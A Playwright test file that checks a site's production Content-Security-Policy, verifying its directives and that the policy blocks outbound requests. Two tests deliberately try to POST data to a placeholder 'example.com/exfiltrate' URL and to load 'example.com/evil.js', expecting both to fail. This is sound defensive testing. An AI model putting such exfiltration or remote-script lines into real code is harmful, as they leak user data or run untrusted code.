import { expect, test } from "./fixtures"

const cspMeta = 'meta[http-equiv="Content-Security-Policy"]'

// The policy is only added to production builds, so these run with playwright.prod.config.ts.
test.describe("Content-Security-Policy", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto("/")
    test.skip((await page.locator(cspMeta).count()) === 0, "dev server has no CSP; run npm run test:e2e:prod")
  })

  test("only allows connections to this site and Cloudflare", async ({ page }) => {
    const csp = await page.locator(cspMeta).getAttribute("content")
    expect(csp).toContain("default-src 'self'")
    expect(csp).toContain("script-src 'self'")
    expect(csp).toContain("connect-src 'self' https://speed.cloudflare.com")
    expect(csp).toContain("object-src 'none'")
  })

  test("blocks sending data to any other site", async ({ page, cspViolations }) => {
    const blocked = await page.evaluate(async () => {
      try {
        await fetch("https://example.com/exfiltrate", { method: "POST", body: "data", mode: "no-cors" })
        return false
      } catch {
        return true
      }
    })
    expect(blocked).toBe(true)
    // This test causes a violation on purpose; clear it so the automatic check doesn't fail the test.
    cspViolations.length = 0
  })

  test("blocks scripts from other sites", async ({ page, cspViolations }) => {
    const ran = await page.evaluate(
      () =>
        new Promise<boolean>((resolve) => {
          const s = document.createElement("script")
          s.src = "https://example.com/evil.js"
          s.onload = () => resolve(true)
          s.onerror = () => resolve(false)
          document.head.append(s)
        }),
    )
    expect(ran).toBe(false)
    cspViolations.length = 0
  })
})
